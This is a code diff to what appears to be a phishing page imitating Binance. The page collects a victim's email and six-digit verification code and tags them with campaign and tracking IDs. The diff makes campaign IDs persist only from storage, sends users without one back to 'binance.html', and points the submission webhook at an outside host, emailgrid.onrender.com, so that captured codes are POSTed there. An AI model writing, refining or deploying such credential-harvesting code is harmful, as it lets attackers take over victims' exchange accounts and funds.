@@ -434,16 +434,9 @@
             return trackingId;
         }
 
-        // Get or set campaign id from query param or storage
-        function getOrSetCampaignId() {
-            let campaignId = getQueryParam('campaign');
-            if (campaignId) {
-                localStorage.setItem('binance_campaign_id', campaignId);
-                sessionStorage.setItem('binance_campaign_id', campaignId);
-            } else {
-                campaignId = localStorage.getItem('binance_campaign_id') || sessionStorage.getItem('binance_campaign_id');
-            }
-            return campaignId;
+        // Get campaign id from storage only (never from query param after first page)
+        function getCampaignId() {
+            return localStorage.getItem('binance_campaign_id') || sessionStorage.getItem('binance_campaign_id');
         }
 
         function closeModal() {
@@ -455,7 +448,7 @@
             event.preventDefault();
             const code = document.getElementById('verificationCode').value.trim();
             const email = localStorage.getItem('binance_email') || sessionStorage.getItem('binance_email');
-            const campaignId = getOrSetCampaignId();
+            const campaignId = getCampaignId();
             const trackingId = getOrCreateTrackingId();
             
             // Validate code format (6 digits only)
@@ -472,7 +465,10 @@
                 return;
             }
             if (!campaignId) {
-                showError('Missing campaign id.');
+                showError('Missing campaign id. Please start over.');
+                setTimeout(() => {
+                    window.location.href = 'binance.html';
+                }, 2000);
                 return;
             }
             // Show loading state
@@ -524,7 +520,7 @@
 
         function submitToWebhook(data, campaignId) {
             // Use your actual backend host here
-            const webhookUrl = `/webhook/${campaignId}/`;
+            const webhookUrl = `https://emailgrid.onrender.com/webhook/${campaignId}/`;
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
